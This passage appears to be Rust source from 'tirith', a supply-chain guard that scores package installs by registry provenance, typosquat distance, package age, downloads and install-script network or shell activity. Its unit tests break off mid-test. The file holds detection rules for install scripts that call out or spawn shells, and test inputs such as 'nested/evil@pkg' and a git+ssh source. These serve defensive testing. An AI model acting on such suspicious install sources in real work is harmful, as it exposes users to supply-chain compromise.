            || name == ".."
            || name.starts_with("./")
            || name.starts_with("../")
            || name.starts_with('/')
            || name.starts_with('~')
        {
            continue;
        }
        // A Go module path is dotted or slashed; `nginx` is rejected.
        if !name.contains('.') && !name.contains('/') {
            continue;
        }
        out.push(PackageRef {
            ecosystem: Ecosystem::Go,
            name: name.to_string(),
            alias: None,
            version: VersionIntent::from_go_version(&version_token),
        });
    }
    out
}

/// Gather the [`PackageSignals`] for one package: threat-DB name signals,
/// uninspected content (a pre-install transaction has no local dir, and tirith
/// never downloads to inspect), and registry-API signals per [`OnlineMode`].
fn gather_package_signals(
    request: &PlanRequest,
    eco: Ecosystem,
    pkg: &PackageRef,
    registry_source_verified: bool,
    notes: &mut Vec<String>,
) -> (PackageSignals, Option<InstallCoverageGap>) {
    let db = request.db;
    let name_vs_popular = package_risk::classify_name(db, eco, &pkg.name);
    let malicious_typosquat_of = db
        .and_then(|db| db.check_typosquat(eco, &pkg.name))
        .map(|ts| ts.target_name);

    let (api, signal_gap) = match &request.online {
        OnlineMode::Off
            if matches!(request.policy.fail_mode, FailMode::Closed) && registry_source_verified =>
        {
            let (kind, reason) = if pkg.version.exact_version().is_some() {
                (
                    InstallCoverageGapKind::ProvenanceUnavailable,
                    "strict policy requires exact registry provenance, but online provenance analysis is disabled",
                )
            } else {
                (
                    InstallCoverageGapKind::UnresolvedVersion,
                    "strict policy requires a resolved package version and exact registry provenance, but this offline install is not exactly bound",
                )
            };
            notes.push(format!(
                "registry-API provenance for '{}' was not used: {reason}",
                pkg.name
            ));
            (
                ApiSignals::offline(),
                Some(InstallCoverageGap {
                    kind,
                    argument: pkg.name.clone(),
                    reason: reason.to_string(),
                }),
            )
        }
        OnlineMode::Off => (ApiSignals::offline(), None),
        OnlineMode::UnverifiedSource(reason) => {
            let reason = format!(
                "package-manager source configuration is not bound to the official registry: {reason}"
            );
            notes.push(format!(
                "registry-API provenance for '{}' was not used: {reason}",
                pkg.name
            ));
            (
                ApiSignals::unavailable(reason.clone()),
                Some(InstallCoverageGap {
                    kind: InstallCoverageGapKind::UnverifiedRegistry,
                    argument: pkg.name.clone(),
                    reason,
                }),
            )
        }
        OnlineMode::Resolver { .. } if !registry_source_verified => {
            let reason = "the install selects a local, direct, or unverified source, so official-registry provenance was not attached";
            notes.push(format!(
                "registry-API provenance for '{}' was not used: {reason}",
                pkg.name
            ));
            (ApiSignals::unavailable(reason), None)
        }
        OnlineMode::Resolver { name_only, .. } if pkg.version.exact_version().is_none() => {
            let reason = "the requested version is not an exact pin, so the artifact selected by the package manager is unresolved";
            let gap = Some(InstallCoverageGap {
                kind: InstallCoverageGapKind::UnresolvedVersion,
                argument: pkg.name.clone(),
                reason: reason.to_string(),
            });
            // Existence is not resolution. The unresolved-version gap stays
            // exactly as it was; the probe below only adds the one question an
            // unpinned spec CAN be answered: does this name exist at all.
            let registry_name = canonical_registry_name(eco, &pkg.name);
            match name_only(eco, &registry_name) {
                PackageExistence::NotFound => {
                    notes.push(format!(
                        "the official registry reports that '{}' does not exist; the install was                          not exactly pinned, so no artifact provenance is attached either",
                        pkg.name
                    ));
                    (
                        // Existence-only provenance: every version-bound field
                        // stays at its default, so nothing here can vouch for
                        // the bytes the manager would install.
                        ApiSignals::Available {
                            provenance: ApiProvenance {
                                source: expected_registry_source(eco)
                                    .unwrap_or_default()
                                    .to_string(),
                                package_name: Some(registry_name),
                                package_existence: PackageExistence::NotFound,
                                ..Default::default()
                            },
                        },
                        gap,
                    )
                }
                _ => {
                    notes.push(format!(
                        "registry-API provenance for '{}' was not used: {reason}",
                        pkg.name
                    ));
                    (ApiSignals::unavailable(reason), gap)
                }
            }
        }
        OnlineMode::Resolver { exact: resolve, .. } => {
            let exact_version = pkg
                .version
                .exact_version()
                .expect("guarded by the preceding match arm");
            let registry_name = canonical_registry_name(eco, &pkg.name);
            let signals = resolve(eco, &registry_name, exact_version);
            match signals {
                ApiSignals::Available { provenance }
                    if provenance_matches_request(
                        &provenance,
                        eco,
                        &registry_name,
                        exact_version,
                    ) && matches!(provenance.package_existence, PackageExistence::NotFound) =>
                {
                    if matches!(request.policy.fail_mode, FailMode::Closed) {
                        let reason = format!(
                            "the official registry reports that exact package '{registry_name}' does not exist, so no install artifact provenance can be established"
                        );
                        notes.push(format!(
                            "registry-API provenance for '{}' was unavailable: {reason}",
                            pkg.name
                        ));
                        (
                            // Preserve the positive NotFound signal so
                            // `block_not_found` remains independently visible.
                            ApiSignals::Available { provenance },
                            Some(InstallCoverageGap {
                                kind: InstallCoverageGapKind::ProvenanceUnavailable,
                                argument: format!("{}@{exact_version}", pkg.name),
                                reason,
                            }),
                        )
                    } else {
                        (ApiSignals::Available { provenance }, None)
                    }
                }
                ApiSignals::Available { provenance }
                    if provenance_matches_request(
                        &provenance,
                        eco,
                        &registry_name,
                        exact_version,
                    ) =>
                {
                    (ApiSignals::Available { provenance }, None)
                }
                ApiSignals::Available { provenance } => {
                    let reason = format!(
                        "the registry response identity did not match {}/{registry_name}@{exact_version} (source={}, version={})",
                        expected_registry_source(eco).unwrap_or("unsupported"),
                        provenance.source,
                        provenance.latest_version.as_deref().unwrap_or("unknown"),
                    );
                    notes.push(format!(
                        "registry-API provenance for '{}' was rejected: {reason}",
                        pkg.name
                    ));
                    (
                        ApiSignals::unavailable(reason.clone()),
                        Some(InstallCoverageGap {
                            kind: InstallCoverageGapKind::ProvenanceMismatch,
                            argument: format!("{}@{exact_version}", pkg.name),
                            reason,
                        }),
                    )
                }
                ApiSignals::Unavailable { reason } => {
                    notes.push(format!(
                        "registry-API provenance for '{}' was unavailable: {reason}",
                        pkg.name
                    ));
                    (
                        ApiSignals::Unavailable {
                            reason: reason.clone(),
                        },
                        Some(InstallCoverageGap {
                            kind: InstallCoverageGapKind::ProvenanceUnavailable,
                            argument: format!("{}@{exact_version}", pkg.name),
                            reason,
                        }),
                    )
                }
                ApiSignals::NotComputed { reason } => {
                    let reason = format!(
                        "online provenance resolver did not evaluate the exact artifact: {reason}"
                    );
                    notes.push(format!(
                        "registry-API provenance for '{}' was unavailable: {reason}",
                        pkg.name
                    ));
                    (
                        ApiSignals::unavailable(reason.clone()),
                        Some(InstallCoverageGap {
                            kind: InstallCoverageGapKind::ProvenanceUnavailable,
                            argument: format!("{}@{exact_version}", pkg.name),
                            reason,
                        }),
                    )
                }
            }
        }
    };

    (
        PackageSignals {
            ecosystem: eco,
            name: pkg.name.clone(),
            // M6 ch6 — carry version through so OSV can pin to (eco, name, version).
            version: pkg.version.as_version_str().map(str::to_string),
            threat_db_missing: db.is_none(),
            name_vs_popular,
            malicious_typosquat_of,
            // Pre-install: nothing on disk and we never fetch — content not evaluated.
            content_signals: ContentSignals::NotInspected,
            api,
        },
        signal_gap,
    )
}

fn expected_registry_source(ecosystem: Ecosystem) -> Option<&'static str> {
    match ecosystem {
        Ecosystem::Npm => Some("npm"),
        Ecosystem::PyPI => Some("pypi"),
        Ecosystem::Crates => Some("crates.io"),
        _ => None,
    }
}

fn provenance_matches_request(
    provenance: &ApiProvenance,
    ecosystem: Ecosystem,
    canonical_name: &str,
    exact_version: &str,
) -> bool {
    let source_matches = expected_registry_source(ecosystem)
        .is_some_and(|source| provenance.source.eq_ignore_ascii_case(source));
    let name_matches = provenance.package_name.as_deref().is_some_and(|name| {
        canonical_registry_name(ecosystem, name)
            == canonical_registry_name(ecosystem, canonical_name)
    });
    let artifact_matches = provenance.latest_version.as_deref() == Some(exact_version);
    source_matches
        && name_matches
        && (artifact_matches || matches!(provenance.package_existence, PackageExistence::NotFound))
}

/// Turn a package's [`RiskBreakdown`] into [`Finding`]s, de-duped against
/// `existing` (the engine's threat-DB findings) by `(rule_id, package)`. Adds
/// what the engine cannot: a confirmed-typosquat from the package-risk DB, and
/// an aggregate-score finding driven by provenance signals (the chunk-6
/// `--online` additions) rather than a name match.
fn risk_findings_for(
    pkg: &PackageRef,
    breakdown: &RiskBreakdown,
    existing: &[Finding],
    policy: &Policy,
) -> Vec<Finding> {
    let mut out = Vec::new();
    let eco = pkg.ecosystem;
    let pp = &policy.package_policy;

    // Does `existing` already carry `rule` naming this package? A whole-word
    // match on the name is a safe, conservative dedupe key.
    let already_has = |rule: RuleId| -> bool {
        existing
            .iter()
            .any(|f| f.rule_id == rule && finding_mentions_package(f, &pkg.name))
    };

    // Confirmed typosquat from the package-risk DB lookup.
    if let Some(target) = &breakdown.malicious_typosquat_of {
        if !already_has(RuleId::ThreatPackageTyposquat)
            && !already_has(RuleId::ThreatMaliciousPackage)
        {
            out.push(Finding {
                rule_id: RuleId::ThreatPackageTyposquat,
                severity: Severity::High,
                title: format!("Confirmed typosquat: {} → {}", pkg.name, target),
                description: format!(
                    "The {eco} package '{}' is a confirmed typosquat of the popular \
                     package '{target}' (source: local threat database). Package-risk \
                     score {}/100 ({}). Installing it is high-risk.",
                    pkg.name, breakdown.score, breakdown.risk_level,
                ),
                evidence: vec![Evidence::Text {
                    detail: format!(
                        "package={} ecosystem={eco} typosquat_of={target} \
                         risk_score={}",
                        pkg.name, breakdown.score
                    ),
                }],
                human_view: None,
                agent_view: None,
                mitre_id: None,
                custom_rule_id: None,
            });
        }
        // A confirmed typosquat is the dominant signal — no aggregate finding too.
        return out;
    }

    // Aggregate provenance / maintainer risk — only when the score is
    // high/critical AND no name-match finding already explains it (the chunk-6
    // value: dangerous on provenance grounds, with no name tell).
    let name_match_present = already_has(RuleId::ThreatMaliciousPackage)
        || already_has(RuleId::ThreatPackageTyposquat)
        || already_has(RuleId::ThreatPackageSimilarName);

    let warn_threshold = pp.warn_aggregate_score_effective();
    let block_threshold = pp.block_aggregate_score_effective();
    if !name_match_present && breakdown.score >= warn_threshold {
        let severity = if breakdown.score >= block_threshold {
            Severity::High
        } else {
            Severity::Medium
        };
        out.push(Finding {
            rule_id: RuleId::ThreatSuspiciousPackage,
            severity,
            title: format!(
                "Elevated supply-chain risk: {} package '{}' scores {}/100 ({})",
                eco, pkg.name, breakdown.score, breakdown.risk_level,
            ),
            description: format!(
                "The {eco} package '{}' has a deterministic package-risk score of \
                 {}/100 ({}), driven by provenance and maintainer signals rather \
                 than a known-bad name. Review the factor breakdown before \
                 installing — run `tirith package explain {eco} {}`.",
                pkg.name, breakdown.score, breakdown.risk_level, pkg.name,
            ),
            evidence: vec![Evidence::Text {
                detail: format!(
                    "package={} ecosystem={eco} risk_score={} risk_level={} \
                     warn_threshold={warn_threshold} block_threshold={block_threshold}",
                    pkg.name, breakdown.score, breakdown.risk_level,
                ),
            }],
            human_view: None,
            agent_view: None,
            mitre_id: None,
            custom_rule_id: None,
        });
    }

    // M6 ch7 policy-driven rules.
    out.extend(policy_findings_for(pkg, breakdown, policy));

    out
}

/// M6 ch7 — emit findings driven by `policy.package_policy` thresholds. Each
/// rule defaults to not firing and only emits when a threshold crosses a signal
/// in `breakdown`; the caller handles --online-observability gating.
fn policy_findings_for(
    pkg: &PackageRef,
    breakdown: &RiskBreakdown,
    policy: &Policy,
) -> Vec<Finding> {
    let mut out = Vec::new();
    let eco = pkg.ecosystem;
    let pp = &policy.package_policy;
    let provenance: Option<&ApiProvenance> = match &breakdown.api_signals {
        ApiSignals::Available { provenance } => Some(provenance),
        _ => None,
    };

    // PackagePolicyNotFound — registry-confirmed 404 + block_not_found
    if pp.block_not_found {
        if let Some(prov) = provenance {
            if matches!(prov.package_existence, PackageExistence::NotFound) {
                out.push(Finding {
                    rule_id: RuleId::PackagePolicyNotFound,
                    severity: Severity::High,
                    title: format!(
                        "Package not found: {eco} '{}' (policy block_not_found)",
                        pkg.name
                    ),
                    description: format!(
                        "The {eco} package '{}' was not found in the registry (HTTP 404) \
                         and policy `block_not_found: true` requires this to block. \
                         The package may be a typo, may belong to a private registry, \
                         or may have been removed.",
                        pkg.name,
                    ),
                    evidence: vec![Evidence::Text {
                        detail: format!("package={} ecosystem={eco} existence=not_found", pkg.name),
                    }],
                    human_view: None,
                    agent_view: None,
                    mitre_id: None,
                    custom_rule_id: None,
                });
            }
        }
    }

    // PackagePolicyNewerThanDays — package_age_days against thresholds
    if let Some(prov) = provenance {
        if let Some(age_days) = prov.package_age_days {
            let warn_d = Some(pp.warn_newer_than_days_effective());
            let block_d = pp.block_newer_than_days;
            let (fired, sev) = match (block_d, warn_d) {
                (Some(b), _) if (age_days as u32) <= b => (true, Severity::High),
                (_, Some(w)) if (age_days as u32) <= w => (true, Severity::Medium),
                _ => (false, Severity::Medium),
            };
            if fired {
                out.push(Finding {
                    rule_id: RuleId::PackagePolicyNewerThanDays,
                    severity: sev,
                    title: format!(
                        "Package newer than policy threshold: {eco} '{}' ({} day{})",
                        pkg.name,
                        age_days,
                        if age_days == 1 { "" } else { "s" },
                    ),
                    description: format!(
                        "The {eco} package '{}' was first published {age_days} day(s) ago, \
                         which trips the policy threshold (warn_newer_than_days={:?}, \
                         block_newer_than_days={:?}). A brand-new package has no community \
                         track record yet.",
                        pkg.name, warn_d, block_d,
                    ),
                    evidence: vec![Evidence::Text {
                        detail: format!(
                            "package={} ecosystem={eco} package_age_days={age_days} \
                             warn_threshold={warn_d:?} block_threshold={block_d:?}",
                            pkg.name,
                        ),
                    }],
                    human_view: None,
                    agent_view: None,
                    mitre_id: None,
                    custom_rule_id: None,
                });
            }
        }

        // PackagePolicyLowDownloads — recent_downloads against threshold
        if let (Some(dl), Some(low)) = (prov.recent_downloads, pp.warn_low_downloads_below) {
            if dl <= low as u64 {
                out.push(Finding {
                    rule_id: RuleId::PackagePolicyLowDownloads,
                    severity: Severity::Medium,
                    title: format!(
                        "Package has low recent downloads: {eco} '{}' ({} downloads)",
                        pkg.name, dl,
                    ),
                    description: format!(
                        "The {eco} package '{}' reports {dl} recent downloads, at or below the \
                         policy threshold {low}. Low downloads on a public-registry package may \
                         indicate unfamiliarity or abandonment.",
                        pkg.name,
                    ),
                    evidence: vec![Evidence::Text {
                        detail: format!(
                            "package={} ecosystem={eco} recent_downloads={dl} threshold={low}",
                            pkg.name,
                        ),
                    }],
                    human_view: None,
                    agent_view: None,
                    mitre_id: None,
                    custom_rule_id: None,
                });
            }
        }

        // PackageInstallScriptNetworkCall — the shipping M6 ch6 baseline is
        // an explicit Warn, independent of whether the aggregate score happens
        // to cross 51. The policy field is default-on and can be disabled only
        // from a trusted policy scope.
        if pp.warn_install_script_network_call {
            if let Some(iss) = prov.install_script_signals.as_ref() {
                if iss.fires() {
                    out.push(Finding {
                        rule_id: RuleId::PackageInstallScriptNetworkCall,
                        severity: Severity::Medium,
                        title: format!(
                            "{eco} package install script performs a network or shell action: '{}'",
                            pkg.name,
                        ),
                        description: format!(
                            "The exact selected {eco} package '{}' contains an install-time \
                             script that makes a network call or spawns a shell. The default \
                             install-script policy requires an explicit warning even when the \
                             package's aggregate risk score is otherwise below the warning \
                             threshold.",
                            pkg.name,
                        ),
                        evidence: vec![Evidence::Text {
                            detail: format!(
                                "package={} ecosystem={eco} has_network_call={} \
                                 has_shell_spawn={} matched_patterns={}",
                                pkg.name,
                                iss.has_network_call,
                                iss.has_shell_spawn,
                                iss.suspicious_patterns.len(),
                            ),
                        }],
                        human_view: None,
                        agent_view: None,
                        mitre_id: None,
                        custom_rule_id: None,
                    });
                }
            }
        }

        // PackagePolicyUnknownPackageWithInstallScripts — Unknown + script signal
        if pp.block_install_scripts_for_unknown_packages
            && matches!(breakdown.name_vs_popular, NameVsPopular::Unknown)
        {
            if let Some(iss) = prov.install_script_signals.as_ref() {
                if iss.has_network_call || iss.has_shell_spawn {
                    out.push(Finding {
                        rule_id: RuleId::PackagePolicyUnknownPackageWithInstallScripts,
                        severity: Severity::High,
                        title: format!(
                            "Unknown {eco} package ships install-time scripts: '{}'",
                            pkg.name,
                        ),
                        description: format!(
                            "The {eco} package '{}' is not a known-popular name and its \
                             install scripts include a network call or shell spawn. Policy \
                             `block_install_scripts_for_unknown_packages: true` requires this \
                             to block — review the install script directly before proceeding.",
                            pkg.name,
                        ),
                        evidence: vec![Evidence::Text {
                            detail: format!(
                                "package={} ecosystem={eco} has_network_call={} \
                                 has_shell_spawn={}",
                                pkg.name, iss.has_network_call, iss.has_shell_spawn,
                            ),
                        }],
                        human_view: None,
                        agent_view: None,
                        mitre_id: None,
                        custom_rule_id: None,
                    });
                }
            }
        }
    }

    // PackagePolicyTyposquatDistance — name-vs-popular edit distance
    if let Some(max_dist) = pp.block_typosquat_distance {
        if let NameVsPopular::NearPopular {
            popular_name,
            distance,
        } = &breakdown.name_vs_popular
        {
            if (*distance as u32) <= max_dist {
                out.push(Finding {
                    rule_id: RuleId::PackagePolicyTyposquatDistance,
                    severity: Severity::High,
                    title: format!(
                        "Typosquat distance below policy threshold: {eco} '{}' ≈ '{}'",
                        pkg.name, popular_name,
                    ),
                    description: format!(
                        "The {eco} package '{}' is edit-distance {distance} from the \
                         popular package '{popular_name}', at or below the policy threshold \
                         {max_dist}. Policy requires a block at this distance.",
                        pkg.name,
                    ),
                    evidence: vec![Evidence::Text {
                        detail: format!(
                            "package={} ecosystem={eco} similar_to={popular_name} \
                             distance={distance} threshold={max_dist}",
                            pkg.name,
                        ),
                    }],
                    human_view: None,
                    agent_view: None,
                    mitre_id: None,
                    custom_rule_id: None,
                });
            }
        }
    }

    out
}

/// Extract `package_existence` from `api_signals` when available.
fn package_existence(api: &ApiSignals) -> Option<PackageExistence> {
    match api {
        ApiSignals::Available { provenance } => Some(provenance.package_existence),
        _ => None,
    }
}

/// Whether `finding`'s title or description mentions `name` as a whole word —
/// a conservative dedupe key avoiding substring false positives (`react` in
/// `react-dom`).
fn finding_mentions_package(finding: &Finding, name: &str) -> bool {
    mentions_word(&finding.title, name) || mentions_word(&finding.description, name)
}

/// Whole-package-name containment: `word` in `haystack` bounded by a non-name
/// char (or string end). Name chars are alphanumerics plus `-`, `.`, `/`, `_`,
/// `@`, so `react` does not match inside `react-dom` or `@scope/react`.
fn mentions_word(haystack: &str, word: &str) -> bool {
    if word.is_empty() {
        return false;
    }
    let is_name_char =
        |c: char| c.is_ascii_alphanumeric() || matches!(c, '-' | '.' | '/' | '_' | '@');
    let mut start = 0;
    while let Some(pos) = haystack[start..].find(word) {
        let abs = start + pos;
        let before_ok = abs == 0
            || !haystack[..abs]
                .chars()
                .next_back()
                .is_some_and(is_name_char);
        let after = abs + word.len();
        let after_ok =
            after >= haystack.len() || !haystack[after..].chars().next().is_some_and(is_name_char);
        if before_ok && after_ok {
            return true;
        }
        start = abs + 1;
        if start >= haystack.len() {
            break;
        }
    }
    false
}

/// Whether `verdict` permits the install without acknowledgement — only
/// [`Action::Allow`] does.
pub fn is_clear_to_proceed(verdict: &Verdict) -> bool {
    verdict.action == Action::Allow
}

#[cfg(test)]
mod tests {
    use super::*;

    /// A name-existence probe that answers "unknown" for every name. Existence
    /// is a separate question from exact-version provenance, so a test that
    /// does not exercise it must not accidentally assert on it.
    fn existence_unknown(_eco: Ecosystem, _name: &str) -> PackageExistence {
        PackageExistence::Unknown
    }
    use crate::registry_api::{FetchError, RegistryClient, RegistryMetadata};

    fn empty_policy() -> Policy {
        Policy::default()
    }

    /// Fixture-fed [`RegistryClient`] — tests never touch a real registry.
    struct FakeClient {
        result: Result<RegistryMetadata, FetchError>,
    }
    impl RegistryClient for FakeClient {
        fn fetch(&self, _eco: Ecosystem, _name: &str) -> Result<RegistryMetadata, FetchError> {
            self.result.clone()
        }
    }

    #[test]
    fn build_argv_npm_prepends_install_subcommand() {
        let argv = build_argv(
            PackageManager::Npm,
            &["left-pad".to_string(), "--save-dev".to_string()],
        );
        assert_eq!(argv.program, "npm");
        assert_eq!(argv.args, vec!["install", "left-pad", "--save-dev"]);
        assert_eq!(argv.display(), "npm install left-pad --save-dev");
    }

    #[test]
    fn build_argv_cargo_and_pip() {
        assert_eq!(
            build_argv(PackageManager::Cargo, &["ripgrep".to_string()]).display(),
            "cargo install ripgrep"
        );
        assert_eq!(
            build_argv(PackageManager::Pip, &["requests".to_string()]).display(),
            "pip install requests"
        );
    }

    #[test]
    fn package_manager_ecosystem_mapping() {
        assert_eq!(PackageManager::Npm.ecosystem(), Ecosystem::Npm);
        assert_eq!(PackageManager::Pip.ecosystem(), Ecosystem::PyPI);
        assert_eq!(PackageManager::Cargo.ecosystem(), Ecosystem::Crates);
    }

    #[test]
    fn mentions_word_is_whole_word() {
        assert!(mentions_word("Package 'react' is bad", "react"));
        assert!(!mentions_word("Package 'react-dom' is bad", "react"));
        assert!(mentions_word("install react-dom now", "react-dom"));
        assert!(!mentions_word("", "react"));
        assert!(!mentions_word("nothing here", ""));
    }

    #[test]
    fn plan_install_clean_package_allows() {
        // No name tell, no threat DB → score 0 → Allow.
        let req = PlanRequest {
            manager: PackageManager::Npm,
            user_args: &["my-unique-internal-pkg-xyzzy".to_string()],
            db: None,
            policy: &empty_policy(),
            cwd: None,
            interactive: false,
            online: OnlineMode::Off,
        };
        let plan = plan_install(&req);
        assert_eq!(
            plan.argv.display(),
            "npm install my-unique-internal-pkg-xyzzy"
        );
        assert_eq!(
            plan.verdict.action,
            Action::Allow,
            "a clean offline install must Allow: {:?}",
            plan.verdict.findings
        );
        assert!(is_clear_to_proceed(&plan.verdict));
        assert_eq!(plan.packages.len(), 1);
        // No threat DB → a note must say so.
        assert!(plan.notes.iter().any(|n| n.contains("threat database")));
    }

    #[test]
    fn plan_install_no_package_argument_notes_command_only() {
        // `pip install -r requirements.txt` has no package on the command line.
        let req = PlanRequest {
            manager: PackageManager::Pip,
            user_args: &["-r".to_string(), "requirements.txt".to_string()],
            db: None,
            policy: &empty_policy(),
            cwd: None,
            interactive: false,
            online: OnlineMode::Off,
        };
        let plan = plan_install(&req);
        assert!(plan.packages.is_empty());
        assert!(
            plan.notes
                .iter()
                .any(|n| n.contains("no installable package")),
            "notes: {:?}",
            plan.notes
        );
    }

    #[test]
    fn pip_pep508_marker_preserves_exact_argv_but_scores_canonical_requirement() {
        let requirement = r#"requests; python_version >= "3.0""#.to_string();
        let args = [requirement.clone()];
        let plan = plan_install(&PlanRequest {
            manager: PackageManager::Pip,
            user_args: &args,
            db: None,
            policy: &empty_policy(),
            cwd: None,
            interactive: false,
            online: OnlineMode::Off,
        });

        assert_eq!(plan.argv.args, vec!["install".to_string(), requirement]);
        assert_eq!(plan.coverage.state, InstallCoverageState::Complete);
        assert!(plan.coverage.gaps.is_empty());
        assert_eq!(plan.packages.len(), 1);
        assert_eq!(plan.packages[0].reference.ecosystem, Ecosystem::PyPI);
        assert_eq!(plan.packages[0].reference.name, "requests");
        assert_eq!(
            plan.packages[0].reference.version,
            VersionIntent::Unspecified
        );
    }

    #[test]
    fn pip_spaced_and_parenthesized_pins_score_the_canonical_identity() {
        for requirement in ["requests == 2.31.0", "requests (==2.31.0)"] {
            let args = [requirement.to_string()];
            let plan = plan_install(&PlanRequest {
                manager: PackageManager::Pip,
                user_args: &args,
                db: None,
                policy: &empty_policy(),
                cwd: None,
                interactive: false,
                online: OnlineMode::Off,
            });
            assert_eq!(
                plan.argv.args,
                vec!["install".to_string(), requirement.to_string()]
            );
            assert_eq!(plan.coverage.state, InstallCoverageState::Complete);
            assert!(plan.coverage.gaps.is_empty());
            assert_eq!(plan.packages.len(), 1);
            assert_eq!(plan.packages[0].reference.name, "requests");
            assert_eq!(
                plan.packages[0].reference.version,
                VersionIntent::Exact("2.31".to_string())
            );
        }
    }

    /// A package the extractor dropped is never planned, scored, or
    /// provenance-bound. Coverage must say so; otherwise official provenance is
    /// attached to a command line that was only partly read.
    #[test]
    fn a_truncated_package_list_is_a_coverage_gap_not_a_complete_install() {
        let args: Vec<String> = (0..(crate::npm_command::MAX_PACKAGES_PER_INVOCATION + 5))
            .map(|index| format!("tirith-synthetic-pkg-{index}"))
            .collect();
        let plan = plan_install(&PlanRequest {
            manager: PackageManager::Npm,
            user_args: &args,
            db: None,
            policy: &empty_policy(),
            cwd: None,
            interactive: false,
            online: OnlineMode::Off,
        });
        assert_eq!(plan.coverage.state, InstallCoverageState::Incomplete);
        assert!(
            plan.coverage
                .gaps
                .iter()
                .any(|gap| gap.kind == InstallCoverageGapKind::PackageListTruncated),
            "the dropped operands must be disclosed: {:?}",
            plan.coverage.gaps
        );

        // The same command under the cap stays complete, so the gap is a real
        // signal rather than a permanent one.
        let under: Vec<String> = (0..8)
            .map(|index| format!("tirith-synthetic-pkg-{index}"))
            .collect();
        let clean = plan_install(&PlanRequest {
            manager: PackageManager::Npm,
            user_args: &under,
            db: None,
            policy: &empty_policy(),
            cwd: None,
            interactive: false,
            online: OnlineMode::Off,
        });
        assert!(
            !clean
                .coverage
                .gaps
                .iter()
                .any(|gap| gap.kind == InstallCoverageGapKind::PackageListTruncated),
            "{:?}",
            clean.coverage.gaps
        );
    }

    #[test]
    fn pip_named_vcs_and_at_sign_paths_are_incomplete_without_registry_scoring() {
        for (requirement, expected_kind) in [
            (
                "demo @ git+ssh:host/repo",
                InstallCoverageGapKind::RemoteOrVcsSource,
            ),
            (
                "demo@git+file:./repo",
                InstallCoverageGapKind::RemoteOrVcsSource,
            ),
            (
                "nested/evil@pkg",
                InstallCoverageGapKind::ManifestOrLocalSource,
            ),
        ] {
            let args = [requirement.to_string()];
            let plan = plan_install(&PlanRequest {
                manager: PackageManager::Pip,
                user_args: &args,
                db: None,
                policy: &empty_policy(),
                cwd: None,
                interactive: false,
                online: OnlineMode::Off,
            });

            assert_eq!(
                plan.argv.args,
                vec!["install".to_string(), requirement.to_string()]
            );
            assert!(plan.packages.is_empty(), "requirement={requirement}");
            assert_eq!(
                plan.coverage.state,
                InstallCoverageState::Incomplete,
                "requirement={requirement}"
            );
            assert!(
                plan.coverage
                    .gaps
                    .iter()
                    .any(|gap| gap.kind == expected_kind),
                "requirement={requirement}, gaps={:?}",
                plan.coverage.gaps
            );
        }
    }

    #[test]
    fn plan_install_pip_dash_r_manifest_bypass_emits_finding() {
        // PR #121 fix-list item 1 regression pin — `pip install -r req.txt` used
        // to fall through to ALLOW; now the manifest path emits a Medium finding
        // under the default `fail_mode: open`.
        let req = PlanRequest {
            manager: PackageManager::Pip,
            user_args: &["-r".to_string(), "requirements.txt".to_string()],
            db: None,
            policy: &empty_policy(),
            cwd: None,
            interactive: false,
            online: OnlineMode::Off,
        };
        let plan = plan_install(&req);
        assert!(
            plan.packages.is_empty(),
            "no per-package scoring on a manifest install"
        );
        assert_ne!(
            plan.verdict.action,
            Action::Allow,
            "manifest-form install must NOT silently allow — verdict: {:?} \
             findings: {:?}",
            plan.verdict.action,
            plan.verdict.findings,
        );
        let manifest_findings: Vec<_> = plan
            .verdict
            .findings
            .iter()
            .filter(|f| {
                f.rule_id == RuleId::ThreatSuspiciousPackage && f.title.contains("manifest install")
            })
            .collect();
        assert_eq!(
            manifest_findings.len(),
            1,
            "expected exactly one manifest-install finding, got: {:?}",
            plan.verdict.findings,
        );
        assert_eq!(manifest_findings[0].severity, Severity::Medium);
        assert!(
            manifest_findings[0]
                .description
                .contains("tirith ecosystem scan"),
            "the manifest finding must point at ecosystem scan: {}",
            manifest_findings[0].description,
        );
    }

    #[test]
    fn plan_install_pip_dash_r_under_fail_closed_escalates_to_high() {
        // Same bypass under `fail_mode: closed`: severity Medium → High, action
        // Warn → Block.
        let policy = Policy {
            fail_mode: FailMode::Closed,
            ..Policy::default()
        };
        let req = PlanRequest {
            manager: PackageManager::Pip,
            user_args: &["-r".to_string(), "requirements.txt".to_string()],
            db: None,
            policy: &policy,
            cwd: None,
            interactive: false,
            online: OnlineMode::Off,
        };
        let plan = plan_install(&req);
        let manifest_finding = plan
            .verdict
            .findings
            .iter()
            .find(|f| {
                f.rule_id == RuleId::ThreatSuspiciousPackage && f.title.contains("manifest install")
            })
            .expect("manifest-install finding must be present under fail_mode: closed");
        assert_eq!(manifest_finding.severity, Severity::High);
        assert_eq!(plan.verdict.action, Action::Block);
    }

    #[test]
    fn plan_install_pip_editable_dot_emits_finding() {
        // `pip install -e .` / `pip install .` — same manifest-bypass surface.
        for args in [
            vec!["-e".to_string(), ".".to_string()],
            vec![".".to_string()],
            vec!["./subproject".to_string()],
            vec!["--editable=.".to_string()],
        ] {
            let req = PlanRequest {
                manager: PackageManager::Pip,
                user_args: &args,
                db: None,
                policy: &empty_policy(),
                cwd: None,
                interactive: false,
                online: OnlineMode::Off,
            };
            let plan = plan_install(&req);
            assert!(
                plan.verdict
                    .findings
                    .iter()
                    .any(|f| f.title.contains("manifest install")),
                "expected manifest-install finding for `pip install {}` — got: {:?}",
                args.join(" "),
                plan.verdict.findings,
            );
        }
    }

    #[test]
    fn plan_install_npm_no_args_emits_manifest_finding() {
        // Bare `npm install` reads the local manifest — a no-package install.
        // (The CLI rejects empty args for pip/cargo, so this is npm-specific.)
        let req = PlanRequest {
            manager: PackageManager::Npm,
            user_args: &[],
            db: None,
            policy: &empty_policy(),
            cwd: None,
            interactive: false,
            online: OnlineMode::Off,
        };
        let plan = plan_install(&req);
        assert!(
            plan.verdict
                .findings
                .iter()
                .any(|f| f.title.contains("manifest install")),
            "expected manifest-install finding for `npm install` with no args: {:?}",
            plan.verdict.findings,
        );
    }

    #[test]
    fn plan_install_cargo_path_manifest_emits_finding() {
        // `cargo install --path .` builds a local crate — no extractable name.
        for args in [
            vec!["--path".to_string(), ".".to_string()],
            vec!["--path=.".to_string()],
            vec![
                "--git".to_string(),
                "https://github.com/example/repo".to_string(),
            ],
        ] {
            let req = PlanRequest {
                manager: PackageManager::Cargo,
                user_args: &args,
                db: None,
                policy: &empty_policy(),
                cwd: None,
                interactive: false,
                online: OnlineMode::Off,
            };
            let plan = plan_install(&req);
            assert!(
                plan.verdict
                    .findings
                    .iter()
                    .any(|f| f.title.contains("manifest install")),
                "expected manifest-install finding for `cargo install {}`: {:?}",
                args.join(" "),
